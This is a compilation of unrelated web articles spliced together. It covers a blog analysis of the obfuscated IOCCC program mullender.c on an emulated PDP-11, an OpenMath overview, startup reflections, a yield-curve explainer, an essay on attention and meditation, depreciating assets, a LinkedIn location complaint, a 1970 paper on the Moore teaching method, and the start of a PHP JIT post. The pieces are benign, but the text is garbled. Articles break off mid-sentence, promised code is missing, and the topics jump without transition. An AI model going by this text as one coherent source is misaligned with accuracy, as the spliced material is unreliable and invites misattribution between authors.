<p>A few years ago I wrote <a href="https://medium.com/@LainIwakura/deobfuscating-obfuscated-code-for-fun-and-no-profit-36ec615c8f5d">two</a> <a href="https://medium.com/@LainIwakura/deobfuscating-code-for-fun-and-no-profit-round-2-60d78b67ebce">posts</a>
on medium.com explaining the workings of some obfuscated programs. After these posts other stuff took priority and I forgot about the world of obfuscation for a while. Now though, I find myself returning to it.
For reasons I’ll explain in a different post I find studying obfuscated code to be quite valuable. So, I thought to myself ‘Well, those last programs I examined were honestly pretty simple. What would it be like to research a truly obfuscated program?’</p>
<p>This post is the story of that journey. I will discuss the code, how I got such old and obscure code to run, as well as include snippets from my conversations with
one of the original authors (who was very helpful in figuring some of this out). If all that wasn’t enough I managed to obtain the original PDP and VAX source code, it will be hosted here with permission. I want to give a huge thank you to Sjoerd Mullender and Don Libes for their assistance and permission in reproducing some of this material.</p>

<p>Because older obfuscated programs tend to be easier to dissect I decided to stay in the early years of the IOCCC (International Obfuscated C Code Contest).
Among those early programs one sticks out as truly interesting - and that is the first IOCCC winner <a href="https://www.ioccc.org/1984/mullender/mullender.c">mullender.c</a>, which I’ve also replicated below because it’s quite short.

  </div>


<p>Where do you start with a program like this? Well, the <a href="https://www.ioccc.org/1984/mullender/hint.text">hint</a> provided by the IOCCC is always a good first step.
From this hint, we can learn a few things necessary to understanding how the program works:</p>
<ul>
<li>Perhaps most importantly, this program will only run on a PDP-11 or VAX-11.</li>
<li>The C startup routine - provided by crt0.o - transfers control to a location named ‘main’ - usually intended to be a function, but in this case it’s an array of shorts</li>
<li>These shorts (represented in different formats to enhance obfuscation) form a meaningful set of PDP-11 and VAX-11 instructions</li>
<li>The first instruction is a branch to the PDP code, and due to the way VAX calls the main ‘function’ it skips the first word of the program (I’ll discuss this more later).</li>
<li>The program prints a string</li>
</ul>
<p>Essentially, the program is a bunch of machine code instructions encoded in various formats. It runs because this code predates ANSI C by a half decade and old compilers seem to have had significantly less qualms about
‘main’ being a function or not (I tried to define ‘main’ as an array of shorts with a modern compiler and it did not like that one bit).</p>

<p>I admit it, the PDP-11 was before my time. I grew up in the Windows 95/98/2000 era, and until recently I didn’t even know what a PDP-11 was.
This ignorance left me kind of stuck, and a brief look on eBay confirmed that I was not going to get a working PDP-11 any time soon. Fortunately though,
an emulator exists. Enter <a href="http://simh.trailing-edge.com/">SimH</a>, it’s more of a suite of emulators for a wide range of historical computers - of which the
PDP-11 is one, and lucky for us the VAX-11 is another.</p>
<p>After a few false starts and misadventures with 2.11BSD, I realized I had no idea what I was doing so I decided I needed some help.
The two original authors of this program are Robbert van Renesse and Sjoerd Mullender, why not try to contact them? So I did.
Robbert didn’t answer my e-mail, but luckily Sjoerd got back to me and was happy to discuss the program. He told me that the
PDP-11 OS they used was Unix v7, so I proceeded on that route.</p>
<p>I managed to <a href="http://a.papnet.eu/UNIX/v7/Installation">find a guide</a> on installing Unix v7 onto this emulator that worked;
and now with my emulator running, and OS installed, I could slap it into a file, compile, and run the thing. Below is what I got.</p>

<figure>
	<img src="https://lainsystems.com/img/running_on_pdp11.gif">
	
		<figcaption>Running the program on the PDP-11 using Unix v7</figcaption>
	
</figure>


<p>The animation is a little choppy, but even still you can hopefully see that it is printing “:-)” across the screen until it is forced to exit (there is no clean way to stop it).</p>
<p>In my discussions with Sjoerd, it was revealed that the string it prints is not exactly “:-)” but instead "  :-)\b\b\b\b”
(NOTE: there should be 2 space characters at the start but my templating engine is removing one for some reason).
It is exactly 9 bytes long. The first 2 characters are whitespace, followed by the :-), finally followed by four ‘\b’
characters. The ‘\b’ characters indicate a backspace. What does the backspace accomplish? Well, if you count 4 characters back from when they begin you’ll see we’re left with a single space - it is at this point
that the program loops and prints the string again. This happens quickly enough that to our eyes it looks like the “:-)” is scrolling across the screen - a clever effect.</p>

<p>As it turns out, the C code is not very useful to examine directly. As it also turns out, the assembly isn’t much better. Below is a small sample of what the assembly looks like (from the PDP-11’s perspective):</p>
<pre><code>    .text
    .globl  _main
    .data
    .even
_main:
    .word   0425 
    .word   04735
    .word   -010041
    .word   031
    .word   0
    .word   0735
    .word   01773
    .word   05757
</code></pre><p>So, what to do? Well, you can actually set up a cross compiler for the PDP-11 and if you go through that effort you can use the objdump program targeted at PDP-11 binaries.</p>
<p>Below is the relevant portion of the objdump - the whole thing is <a href="https://lainsystems.com/mull_objdump.txt">here</a>, but not all of it is useful. Sjoerd confirmed that the PDP code is
from _main+0x2c to _main+0x4a (inclusive). Of course, the first word is also a PDP-11 instruction. Everything I’ve ommitted is related to the VAX portion of
the program which we will get back to. (It’s also not proper VAX code since the disassembler thinks everything is PDP-11).</p>
<pre><code>   0:   0115            br  0x2c
  2c:   11c4            mov pc, r4
  2e:   0be4            tst -(r4)
  30:   e5c4 0009       sub $11, r4
  34:   1137 0006       mov r4, $0x3e
  38:   15c0 0001       mov $1, r0

  4a:   01f0            br  0x2c
</code></pre><p>Before going further there are 2 important things to know about PDP-11 assembly code:</p>
<ul>
<li>The PDP-11 works primarily with octal. All the addresses and instructions are encoded in octal.</li>
<li>In an instruction like <code>mov pc, r4</code>, you are moving pc INTO r4, not r4 into pc. Personally, I got used to this pretty quickly.</li>
</ul>
<p>The first number in the original program is 277, put that into a hex converter and you’ll get 115 like we see in the objdump. More interesting though is what you get translating it into octal - 425.
How does 0425 get you br 0x2c though? Well for that you need to grab some <em>manuals</em>. I got my hands on a lot of old manuals for these computers but the most useful one was the PDP-11/45 Handbook from 1973.
It would helpfully describe the instruction format, and exactly what it did. Below is an example of the page for the unconditional branch instruction.</p>

<figure>
	<img src="https://lainsystems.com/img/pdp11-branch.png">
	
		<figcaption>PDP-11/45 Handbook Describing the Branch instruction</figcaption>
	
</figure>


<p>As you can see, it sets the program counter to pc + 2x the offset - which is 25 (octal) in our case. Since the program counter at the start of our program is 2 (because it points to the next word to execute),
we get 2 + (25 x 2), or 2 + 52 = 54, which translating back into hex gives us 2c. Cool!</p>

<p>Now that we know how the branch works we can examine the main stuff - I won’t go into huge depth with the manuals for each little instruction but doing so is fun if you’re bored and enjoy that sort of thing.</p>
<p>The next relevant portion of code is this:</p>
<pre><code>  mov pc, r4
  tst -(r4)
  sub $11, r4
  mov r4, $0x3e
  mov $1, r0
  sys 4
  halt
  .word   11
</code></pre><p>We move the program counter into the r4 register and then use the ‘test’ (tst) instruction. This has the effect of clearing the some flags in the PSW (processor status word), and because
the register is using ‘Autodecrement mode’ it will subtract 2 from the value stored at r4. When using autoincrement / decrement, it will go by 1 in byte instructions or 2 in word instructions.
After this we subtract 11 from r4, but 11 is actually 9 (used to octal yet?). Then we store r4 into…0x3e? Well, if you look back at the objdump you’ll see that 0x3e is ‘halt’ or 0000. This
mov instruction overwrites that value with the contents of r4. We move 1 into r0 (1 indicating STDOUT), and call ‘sys 4’. The next line will be the value of r4 as just mentioned, and <code>.word 11</code>
simply inserts octal 11 directly into that spot. If you’re wondering what exactly is in r4 and why we’re doing all this stuff, be patient - we’re getting there.</p>
<p>If you’re familiar with system calls, you probably know what’s going on. If not, all of this is to setup the <a href="https://en.wikipedia.org/wiki/Write_(system_call)">write</a> system call. I
actually made a <a href="https://retrocomputing.stackexchange.com/questions/15590/trying-to-understand-some-assembly-syntax-in-the-unix-v7-write-system-call">post on the retro-computing stackexchange</a>
asking about the workings of this call internally - I recommend checking it out if you want further clarity on how this works.</p>
<p>After this we have the final 3 lines of PDP code which are:</p>
<pre><code>  mov $1000, r2
  sys 55
  sob r2, 0x46
</code></pre><p>We put 1000 into r2, and call system call 55. After this, we use the ‘sob’ instruction - which is ‘subtract one and branch’ and not an invitation to cry - to see if r2 is 0 yet. If it isn’t, we branch
to the previous line and call system call 55 again. loop until r2 is 0. Syscall 55 eh? Which …</p></div></div></div>

  <p>OpenMath is an emerging standard for representing mathematical objects with their semantics, allowing them to be exchanged between computer programs, stored in databases, or published on the worldwide web. While the original designers were mainly developers of computer algebra systems, it is now attracting interest from other areas of scientific computation and from many publishers of electronic documents with a significant mathematical content. There is a strong relationship to the MathML recommendation from the Worldwide Web Consortium, and a large overlap between the two developer communities. MathML deals principally with the presentation of mathematical objects, while OpenMath is solely concerned with their semantic meaning or content. While MathML does have some limited facilities for dealing with content, it also allows semantic information encoded in OpenMath to be embedded inside a MathML structure. Thus the two technologies may be seen as highly complementary.</p>

<p>Mathematical objects encoded in OpenMath can be</p>

<ul>
  <li>displayed in a browser</li>
  <li>exchanged between software systems</li>
  <li>cut and pasted for use in different contexts</li>
  <li>verified as being mathematically sound (or not!)</li>
  <li>used to make interactive documents really interactive.</li>
</ul>

<p>OpenMath is highly relevant for persons working with mathematics on computers, for those working with large documents (e.g. databases, manuals) containing mathematical expressions, and for technical and mathematical publishing.</p>

<p>The worldwide OpenMath activities are coordinated within the OpenMath Society, based in Helsinki, Finland. It is coordinated by an executive committee, elected by its members. It organizes regular workshops and hosts a number of electronic discussion lists. The Society brings together tool builders, software suppliers, publishers and authors.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I had an hour-long conversation yesterday talking to a fellow entrepreneur who quit the adventure and took a job. He was curious to know what I had done differently to arrive at a positive outcome.</p><p>My first reaction was to tell him that this is not my first attempt. </p><p>I've tried building a company twice before and failed miserably. I even tried building a breakfast delivery business in 2015 (I had no idea what I was doing back then) and I made ₹85,000 in revenue before I shut it down.</p><p>SuperLemon is actually my fourth attempt. Sankalp and I did just enough things right this time (or avoided just enough mistakes) to make the business work. </p><p>The journey to reaching here was long, filled with doubt internally and from everyone around me, even frustrating and hopeless at times.</p><p>Out of all the things we talked during the call, the three things that stood out to me were:</p><h3><strong>1-</strong> I kept trying again and again</h3><p>If something didn't work, I would find a job to save up and try again as soon as I have a year's worth of runway and a strong enough conviction about the idea. </p><p>As of today, I don't see any other path in life but building businesses.</p><h3><strong>2-</strong> I knew when to quit</h3><p>When things weren't working out no matter our best effort, clearly there was something wrong. I spent 12 months on my second venture before realising there's no market demand. </p><p>But I quit my third venture (right before SuperLemon) in about 4 months when it was obvious to me that it wasn't going to work.</p><h3><strong>3-</strong> Introspect </h3><p>After every attempt or failure, I would spend between 1-3 months in intense introspection of what went wrong. </p><p>This wasn't an exercise to beat myself up over it, but rather to learn what I need to do differently the next time for things to work out more favourably.</p><h3>If you're a budding entrepreneur</h3><p>I don't recommend this path to anyone unless they are willing to take all the pain and failures, learn from them, and try again with the hope to eventually get it right.</p><p>Quit sooner than later when something isn't working, but only if you've understood why it won't work. </p><p>Ask always yourself if you're in it for the long haul. Otherwise you might as well quit right now.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2> What is the yield curve?</h2><p>The Yield Curve shows current yield rates, for US Treasuries, at varying maturities. That was a lot of jargon, so let's break it down.</p><canvas></canvas><p>US Treasuries represent bonds issued by the US Government. Think of a bond as any loan - the issuer of a bond has to pay interest each month, and the amount borrowed at maturity. Maturity refers to the period after which the bond is to be paid back. The US Government issues bonds for varying maturity rates, from 30 days to 30 years. And finally, the yield rate represents the effective interest rate for a bond, based on its current price.</p><h2>Why does it matter?</h2><p>The yield curve sets the basic, or lowest possible, interest rates. Any changes in the yield curve have a ripple effect across the entire economy.</p><p>Effectively, the yield curve represents current interest rates for the US Government. The US Government is considered the safest borrower in the economy. So, it gets to borrow money at the lowest possible interest rates. Everyone else has to pay more interest, to compensate for the added risk. </p><p>Let's take a concrete example. On September 4, 2019, Apple issued bonds worth $7bn. These bonds had maturities ranging from 3 years, to 30 years. The yield rate on these bonds was higher than the US Government bond yields on the same day.</p><canvas></canvas><p>Similarly, if you want to take out a 30 year mortgage, your interest rate will be some number plus the interest rate of the 30 year treasury.</p><p>So when the yield curve rises, that means interest rates for everyone go up. It becomes more expensive for Apple to borrow money, or for you to get a mortage. If it's more expensive to borrow money, it's more expensive to spend money; and in this way, higher interest rates make economic growth harder.</p><p>The yield curve also matters because it's considered a predictor for future recessions.</p><h3>How is the yield curve a recession indicator?</h3><p>The shape of the yield curve offers some clues. In normal times, the yield curve slopes upwards. Remember, the higher risk the, the higher the interest rate. Shorter periods are safer - it's easier to predict what will happen in the next 30 days, than in the next 30 years.</p><p>When the yield curve is <em>inverted</em>, something is wrong. It means that rates for long term-periods are lower than interest rates for short-term periods. This is rare, and breaks the relationship we described above. It's so abnormal, that it is a reliable predictor of economic recessions.</p><p>The chart below is an example of an inverted yield curve; specifically, the yield curve for August 11, 2006. Yield curves were inverted for much of 2006 and 2007. It proved prophetic. In late 2007 we entered the deepest economic recession since the 1930s.</p><canvas></canvas><p>The graph below shows the <em>spread</em> between the 10 year treasury and the 3 month treasury. The spread is just the difference between two interest rates; so anytime the spread drops below 0, it means the yield curve was inverted on that day.</p><canvas></canvas><h3>How does this matter as a personal investor?</h3><p>One way to use the yield curve is to check whether it is inverted. If the yield curve is inverted, postpone taking any loans if you can. An inverted yield curve is a sign that the rates might be lower in the future, so you'd want to wait for that to happen. It's also a sign that there might be economic trouble ahead; so ensure your savings are truly safe.</p><p>The yield curve can help you identify opportunities to refinance old mortgages or loans. If interest rates have dropped since the day you took the loan, you might have an opportunity to refinance it at a lower interest rate.</p><p>The yield curve doesn't change frequently; check it once per quarter.</p><h2>How does it change?</h2><h3>The Federal Reserve manages parts of the yield curve.</h3><p>The Fed's job is to manage inflation and maintain economic growth. They use a variety of tools to do so. For the moment, don't worry about how the Fed does it - just know that the Fed has lots of control over short term rates, but only some control over long term rates.</p><p>During a recession the Fed's goal is to get the economy growing again. In order to do so, it will cut interest rates. As explained above, high interest rates reduce spending, while low interest rates stimulate spending. When spending is stimulated, the economy grows, and things eventually return back to normal.</p><p>The Fed is good at its job, and is reliable, so the relationship described above works well. So well, that investors know the Fed will do so when a recession hits. If investors think a recession is coming 2 years from now, they'll start betting that interest rates will drop. This in fact causes <strong>yield rates</strong> to fall, resulting in an inverted yield curve. </p><p>But there are limits to what the Fed can actually do.</p><h3>What's happening during COVID-19?</h3><p>The yield curve is considered extremely flat today. The chart below shows the spread between 30 day and 30 year bonds. The lower the spread, the flatter the yield curve.</p><p>The Fed has committed to keeping interest rates as as close to 0 as possible. COVID-19 has hit the economy hard; low interest rates are needed to stimulate the economy as much as possible, but the Fed might be hitting its limits.</p><h3>What could the future look like?</h3><p>There's a notion of the <em>Zero Lower Bound</em>. Theoretically, interest rates can't drop below 0%. Negative interest rates are weird - that implies being paid to take out a loan. For a long time, it was assumed that the bound was a hard one. Meaning that once the Fed has cut interest rates to 0%, it can't do anything more to stimulate the economy.</p><p>Firstly, we've discovered that 0% might not be the lower bound. European central banks, such as the Swiss central bank, have run interest rates lower than 0% for some time now.</p><p>Secondly, the Fed has discovered new tools to stimulate the economy. A notable example is Quantitative Easing, first used in the aftermath of the 2008 financial crisis. The Fed has started to do it again; but this time around, the effects have been very different. To be explained in a future post!</p><h2>What else do I need to know?</h2><p>The Fed is one of many interacting agents in the world of interest rates; we haven't discussed inflation or gone into details about the role that investors play.</p></div></div></div>]]>

      <article role="main">
        <p>This isn’t going to be a post about how adopting a several-thousand-year-old practice <a href="https://www.independent.co.uk/life-style/health-and-families/healthy-living/mindfulness-sells-buddhist-meditation-teachings-neoliberalism-attention-economy-a8225676.html">can make you a better servant of capital</a>.
Instead, let’s talk about when I feel the lowest of the low.
It comes after spending any number of hours on my computer, maybe even a full day, endlessly circling around different websites in search of stimulation, the quick jolt that comes with learning an interesting fact or watching a funny short video or seeing someone get dunked on for having a bad political opinion.
I’ll eventually wake into a state that could be identified as conscious thought, look back on the many (genuinely exciting!) things I wanted to learn or do that day, and contrast it with what I actually did.
What did I actually do? I honestly don’t even know. I doubt I could list even three things I’d read or experienced the entire preceding eight hours.
At this moment I feel very bad. I know one of the ~30,000 days in my life is gone.
And I didn’t get anything out of it.
Actually, I’m worse off, because spending your time in this way just begets even more time spent in this way.</p>
<p>I don’t have any social media apps on my phone.
I deleted my twitter account.
I deleted my reddit account.
I don’t have an instagram account.
My facebook account exists only to be part of some groups.
I use LeechBlock.
I redirect websites to 0.0.0.0 in my hosts file.
Everyone I know does most of these things.
Everyone I know still has trouble spending their time how they actually want to spend it.
If I were to write down a list of the things I find most important in life, endlessly circling around a handful of websites would not even be in consideration.</p>
<p>If I get stuck in the loop for more than a week or so my brain starts to eat itself.
There’s a visceral knawing feeling.
My thoughts dwell on how to defeat this thing which is deleting hours from my life.</p>
<p>So far the only thing which has helped is mindfulness meditation.
After sitting for 10 or 20 minutes and focusing on my breath, my mind becomes quiet.
Traffic on the <a href="https://en.wikipedia.org/wiki/Default_mode_network">default mode network</a> dies down a little bit.
I’m no longer instantly pulled into the online vortex upon encountering the slightest speedbump in my work.
Instead my mind just… stays quiet, and I keep the problem in my head.
This doesn’t last forever.
I could probably meditate for 10 minutes out of every hour and still have spent more time on the things I actually wanted to spend time on, at the end of the day.</p>
<p>Deciding to meditate is hard.
The idea of spending ten minutes intentionally doing nothing runs against a lot of messaging I’ve internalized.
It’s also very difficult to keep my attention on my breath instead of running away to consider whatever figment wanders through my thoughts.
There’s an interesting metaphor I’ve heard.
Your mind is like a train station.
Thoughts think themselves - they are trains pulling into the station.
A train of thought will shortly pull out of the station, but you don’t have to be on it.
Or maybe you just boarded it without thinking, then don’t realize what you’ve done until you’re a mile down the track.
No worries; you can always return to the station.</p>
<p>I decided to try mindfulness meditation after listening to the audio version of Robert Wright’s book <a href="http://whybuddhismistrue.net/">Why Buddhism Is True</a> while on a cross-country drive.
It’s about how many beliefs in Buddhism - specifically Western Atheistic Buddhism - have support from modern psychology &amp; neuroscience.
I wasn’t motivated to start meditating by thinking it would help me in this struggle for my attention; the discovery was quite accidental.
I use the <a href="https://www.wakingup.com/">Waking Up</a> app.
Friends of mine also report good experiences with <a href="https://www.headspace.com/">Headspace</a>.</p>
<p>It’s troubling I have to go to such lengths to live my life the way I think I want to live it.
Maybe this struggle is uniquely modern, maybe it’s one for the ages.
I still have issues sometimes, especially before bed when my defenses are lower and I can get sucked into the loop instead of reading a good book or just going to sleep.
Still, for the first time in my life I’ve found an actually effective tool for resisting the attention economy.</p>

<p>All <a href="https://www.dollartrak.com/2020/05/22/assets-explained/">assets</a> are not created equal.  Some go up in value and some don’t.  A depreciating asset is one that goes down in value over time.  Examples of depreciating assets are cars, boats, motorcycles, computers, RVs and furniture.  These assets will almost always be worth less than what you paid for them when you decide to sell them.</p>



<p>Many depreciating assets, such as cars, also have other costs associated with their ownership as well. Taxes, insurance, fuel and maintenance can all add up to make your total cost of ownership of a depreciating asset much higher than is reflected in the purchase price.</p>



<h2>Depreciation Rate  </h2>



<p>The difference between what you paid and what you sell the item for is your cost to own the asset.  Not all items of the same type depreciate at the same rate.  Luxury cars such as a BMW might depreciate at 20% a year, where as a Toyota Tacoma might only depreciate at 10% a year.  </p>

<p>Take the depreciation rate into account when making a large purchase as it will greatly affect the total cost to own the asset.  Not only would a BMW be double the purchase price of the Tacoma, but it would also depreciate twice as fast.  This ultimately makes your total cost to own the vehicle 4 times as high!</p>



<h2>Limit spending on Depreciating Assets</h2>



<p>You will want to limit the money you spend on depreciating assets as much as possible.  In general these assets will not help you to compound your wealth.  You will need to purchase depreciating assets to live your life but don’t fool yourself into thinking that these material purchases make you wealthy.  In fact they do just the opposite!  </p>



<p>Every dollar you spend on a depreciating asset is one that you cannot invest.  Due to the compounding nature of investment returns you can actually lose out on many times the original purchase price of the depreciating asset due to the <a href="https://www.dollartrak.com/what-is-opportunity-cost/">opportunity cost</a>. </p>



<h2>Conclusion</h2>



<p>Depreciating assets are generally material goods that you purchase to use.  As they age they lose value, decreasing your <a href="https://www.dollartrak.com/net-worth-explained/">net worth</a> in the process.  Limit your spend here so that you can concentrate on investing the savings instead.  </p>



<p>Whatever your <a href="https://www.dollartrak.com/set-and-achieve-financial-goals/">financial goals</a> are, overspending here will make them harder to obtain.</p>

<p>I got this email from Linkedin this morning. It is telling me that they are going to change my location from “<strong>Auckland, New  Zealand</strong>” to “<strong>Auckland, Auckland, New Zealand</strong>“. </p>



<figure><img loading="lazy" width="496" height="512" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-33-26.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-33-26.png 496w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-33-26-291x300.png 291w" sizes="(max-width: 496px) 100vw, 496px"><figcaption>Email from Linkedin on 30 August 2020</figcaption></figure>



<p>Since “Auckland, Auckland, New Zealand” sounds stupid to New Zealanders (Auckland is pretty much a big city with a single job market and is not a state or similar) I clicked on the link and opened the application to stick with what I currently have</p>



<figure><img loading="lazy" width="912" height="557" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46.png 912w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46-300x183.png 300w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46-768x469.png 768w" sizes="(max-width: 912px) 100vw, 912px"></figure>



<p>Except the problem is that the pulldown doesn’t offer many any other locations</p>



<figure><img loading="lazy" width="546" height="316" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-38-03.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-38-03.png 546w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-38-03-300x174.png 300w" sizes="(max-width: 546px) 100vw, 546px"></figure>



<p>The only way to change the location is to click “use Current Location” and then allow Linkedin to access my device’s location.</p>



<div><p>According to <a href="https://www.linkedin.com/help/linkedin/suggested/110568">the help page</a>:</p><p><em>By default, the location on your profile will be suggested based on the postal code you provided in the past, either when you set up your profile or last edited your location. However, you can manually update the location on your LinkedIn profile to display a different location.</em></p></div>



<p>but it appears the manual method is disabled. I am guessing they have a fixed list of locations in my postcode and this can’t be changed.</p>



<p>So it appears that my options are to accept Linkedin’s crappy name for my location (Other NZers have posted problems with their location naming) or to allow Linkedin to spy on my location and it’ll probably still assign the same dumb name.</p>



<figure><img loading="lazy" width="489" height="42" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-48-43.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-48-43.png 489w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-48-43-300x26.png 300w" sizes="(max-width: 489px) 100vw, 489px"></figure>



<p>The basically appears to be a way for Linkedin to push user to enable location tracking. While at the same time they get to force their own ideas on how New Zealand locations work on users.</p>

<p><span size="-1">Dancis, J. &amp; Davidson, N. "The Texas Method and the Small Group Discovery Method." (1970).
<p><i>Jerome Dancis wrote a Ph.D. thesis in topology under the direction of RH Bing, a student of R.L. Moore. He is a professor of mathematics at the University of Maryland.</i></p>
<p><i>Neil Davidson studied topology at the University of Wisconsin and wrote a Ph.D. thesis in mathematics education on the small group discovery method. He is a professor education at the University of Maryland and past president of an international society devoted to cooperative learning.</i></p>


<p><b>INTRODUCTION</b></p>
<p>We shall discuss two methods of instruction in which students function as junior mathematicians. The purpose of this paper is to describe these methods and their goals, in the hope of inducing some of our colleagues to try them.</p>
<p>The "basic thesis" of the "Texas" method or Moore method is that bright students can develop mathematics by working individually within a competitive system. The basic thesis of the small group discovery method is that average or better students can develop mathematics by working together as a small group within a cooperative system. We shall discuss these methods only in the context of teaching individual classes which are part of a standard curriculum.</p>
<p>The methods described here have special goals, namely: To directly help students develop some of the abilities which characterize the working mathematician. In general, these methods are used to develop mathematical creativity and intuition, as well as skill in logical reasoning. In particular, these methods concentrate explicitly on (1) the ability to invent techniques for solving problems and proving theorems, (2) the ability to make conjectures and educated guesses, and (3) the ability to present a coherent argument. The students develop these abilities as they master a moderate amount of mathematical knowledge.</p>
<p>With the methods described here, emphasis is placed on the discovery of new ideas by the students. The students learn mathematics as active participants, rather than as spectators. There are opportunities for students to present their ideas and results to their peers and to the teacher.</p>
<p>Basically, an instructor who is using these methods does not lecture; instead he provides his students with a good outline of the course. The students establish the theorems, solve the problems, and work out the examples in this outline. With these methods, the students spend considerably more time proving theorems, solving problems, making conjectures, and presenting their results than they do in the average mathematics course. With these activities, the students participate in building the mathematical theory in a course. Thus, students learn by direct experience that mathematical results are developed by human beings and are not handed down "from on high."</p>
<p>In the next two sections we shall present a partial description of the Moore method and of the small group discovery method. In the fourth and fifth sections we shall discuss mathematical content and procedural considerations which are common to both methods.</p>

<p><b>THE TEXAS METHOD</b></p>
<p>The Texas (or Moore) method was developed and used very successfully by Professor R.L. Moore for half a century at The University of Texas. (See [3, 4, 7, 8].) Many people consider the Texas method to be precisely R.L. Moore's style of teaching at The University of Texas. We take a much broader view, which can encompass the variations on the Texas method used by many teachers. Our discussion will concentrate upon basic procedures which can be used, in our opinion, by most practitioners of this system.</p>
<p>Moore developed his teaching method as a complete mathematical education system: From trigonometry and calculus through the Ph.D. thesis. He developed his own curriculum and course syllabi, and decided the class size, which was frequently quite small. He restricted class membership to students who agreed to cooperate with his methods. He selected his students on the basis of personal interviews or past performance in courses taught by his methods.</p>
<p>In contrast, here we will only discuss Moore's method in the context of teaching individual mathematical courses which are part of a curriculum. Thus we have more constraints and considerably less freedom than did R.L. Moore.</p>
<p>We now proceed to describe certain aspects of the Moore method. Under this method each student proves as many theorems and solves as many problems as possible by himself outside of class. For each theorem or problem, one student presents, at the blackboard, a proof or a solution that he devised by himself. Students are not permitted to discuss mathematics outside of class. The Texas method makes use of a competitive atmosphere. There is competition among students to impress the teacher and to solve more of the difficult problems than their classmates. Friendly competition spurs many students to work harder than they would otherwise, and occasionally to work above and beyond reasonable limits (i.e., to the detriment of other courses).</p>
<p>Students sometimes work on a difficult theorem for a week or more until someone finally proves it. In advanced courses some of the problems are open questions, and some of their solutions have become Ph.D. theses. Thus, the Texas method requires and tends to produce student willingness to work on problems for long periods of time. Considerable increases in a student's self confidence will result from his solving difficult problems.</p>
<p>We now present a brief description of blackboard procedures. In selecting someone to present a solution to the class, the teacher picks one of the students who claims to have <i>already</i> solved the problem by himself outside of class. Some teachers prefer to call on the weaker students first. (If a student is hot upon the trail of a theorem and doesn't want to see someone else's proof, he may leave class during the presentation.)</p>
<p>Suppose a student is presenting a proof to the class, and a mistake is found in the proof. If the student can repair the damage immediately - fine; however, the teacher does not permit the student to flounder at the blackboard while attempting to repair his proof. If the mistake in the student's proof can be corrected, the student is permitted to try again, usually the next day. However, if the student shows little understanding of the problem, the teacher might choose to send another student to the board to present a solution.</p>
<p>During a weak student's presentation, the instructor <i>should</i> be supportive. This includes helping the student clarify <i>his</i> [the student's] ideas and statements. Proper use of this system does <i>not</i> include the teacher embarrassing or actively discouraging the weaker student; he does not permit other class members to do so either.</p>
<p>One method of grading is for the instructor to give a standard-type final examination and to use the results of this examination as the main criteria for grading those students who have presented few results to the class.</p>
<p>The Texas method does a spectacular job of differentiating between the stronger and the weaker students. This method has been used as a filtering device to identify mathematical talent. The filter has also convinced other students that they do not really want to become mathematicians. </p>
<p>The Moore method is well suited for courses at the senior and first year graduate level and for some research courses. A senior level course in topology or complex variables is a good course for a teacher to first try out the Moore method. The authors have no experience and some apprehension about using the Moore method in isolated freshman or sophomore courses which are part of a standard curriculum.</p>
<p>We conclude by noting that the Moore method tends to develop ambition, a competitive spirit, and perhaps "Texas-style individualism." Its most striking success has been in the field of point-set topology. The list of R.L. Moore's doctoral students includes a sizable number of outstanding researchers in topology. [7]</p>

<p><b>THE SMALL GROUP DISCOVER METHOD</b></p>
<p>The small group discovery method [1, 2] was developed in 1967 at the University of Wisconsin by Neil Davidson. He started with the idea established by R.L. Moore that bright students can develop mathematics. He then changed the social environment so as to render the idea workable for much larger numbers of students in undergraduate courses.</p>
<p>Under the small group discovery method the class is divided into small groups with three or four members per group. Each group discusses the theorems (or problems) and proves them cooperatively as a group effort during class. Every group has its own section of the blackboard for working space, and the members write a group solution on the board for each problem. The teacher moves from group to group, checks the proofs (or solutions) on the board, and gives suggestions for improvement. If a group is having trouble with a problem, the teacher might ask a discerning question or, if necessary, give the group a hint.</p>
<p>A group of students will solve a problem that each of the group members would give up on if he were working on it by himself. Each problem is usually designed so that a small group can solve it within one class period. Students in the group usually work at the board on problems they have not seen before the class period. The teacher should assign additional homework problems to be solved by individual students outside of class.</p>
<p>At the beginning of a semester, the teacher should tell students how to cooperate in a small group. Within a group, it is intended that everyone participates and that no one dominates the discussions. There is no appointed leader of a group. A student can ask questions within his group without risking embarrassment in front of the teacher and the whole class; the other group members try to provide satisfactory answers. All the group members must understand a proof or problem solution before the group attacks another problem.</p>
<p>A group with five or more members is too …</p></span></p></div></div>

<p>PHP has a Just In Time compiler (JIT) since its most recent major version, PHP 8.</p>
<p>Here's a demo of JIT's impact on PHP. The video was recorded by Zeev, a core
developer of the php engine, to demonstrate the performance difference between
php 7.0 and JIT when generating fractals.</p>
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/dWH65pmnsrI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""><iframe style="margin: auto; margin-bottom: 20px;" width="560" height="315" src="https://www.youtube-nocookie.com/embed/dWH65pmnsrI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<p>It is fair to expect great performance improvements after watching this video,
especially if you remember the amazing boost when migrating from php 5 to 7.
But soon you'll notice that such gains aren't for most applications (unless
